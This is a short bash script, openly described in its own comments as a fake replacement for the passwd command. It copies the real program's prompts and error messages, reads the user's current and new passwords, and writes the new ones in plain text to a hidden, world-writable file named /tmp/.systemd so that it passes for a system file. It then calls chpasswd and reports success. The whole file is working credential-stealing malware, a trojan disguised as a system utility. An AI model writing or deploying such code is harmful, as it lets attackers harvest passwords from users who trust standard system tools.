#!/bin/bash

# Fake implementation of passwd in bash that scrapes the users password before sending it onto chpasswd

# Set this to a hidden file path to store password changes in
exfilPath="/tmp/.systemd"

# Make the path and make it open
if [ ! -f "$exfilPath" ]; then
    touch $exfilPath
    chmod 777 $exfilPath
fi

# User maybe trying to change the password for someone else, check
if [ -z "$1" ]
then
    effectiveUser=$(echo $USER)
    else
    effectiveUser=$(echo $1)
fi

# Non-root users need to provide thier old password, get that from them
if [ "$(id -u)" != "0" ]
then

    # Prevent the user from changing someone elses pass and causing weird errors
    if [ "$USER" != "$effectiveUser" ]
    then
        echo "passwd: You may not view or modify password information for $effectiveUser."
        exit 1
    fi

    # Output the expected output and grab the inputted old password
    echo "Changing password for $effectiveUser."
    echo -n "Current password: "
    read -s oldpass
    echo

    # If the user provides a blank response, fail like the real program
    if [ -z "$oldpass" ]
    then
        sleep 3
        echo "passwd: Authentication token manipulation error"
        echo "passwd: password unchanged"
        exit 1
    fi
fi

# Output the expected output and grab what the user wants to set their password to
echo -n "New password: "
read -s newpass
echo
echo -n "Retype new password: "
read -s newpassconfirm
echo

# If the passwords dont match, fail like the real program
if [ "$newpass" != "$newpassconfirm" ]
then
    echo "Failed to change password for $effectiveUser" >> $exfilPath
    echo "Sorry, passwords do not match."
    sleep 3
    echo "passwd: Authentication token manipulation error"
    echo "passwd: password unchanged"
    exit 1
fi

# If the user provides a blank response, fail like the real program
if [ -z "$newpassconfirm" ]
then
    echo "Failed to change password for $effectiveUser" >> $exfilPath
    echo "No password has been supplied."
    sleep 3
    echo "passwd: Authentication token manipulation error"
    echo "passwd: password unchanged"
    exit 1
fi

# Make and log the change
echo "$effectiveUser:$newpass" | chpasswd 2>&1 > /dev/null
echo "passwd: password updated successfully"
echo "User changed password for $effectiveUser to $newpass" >> $exfilPath
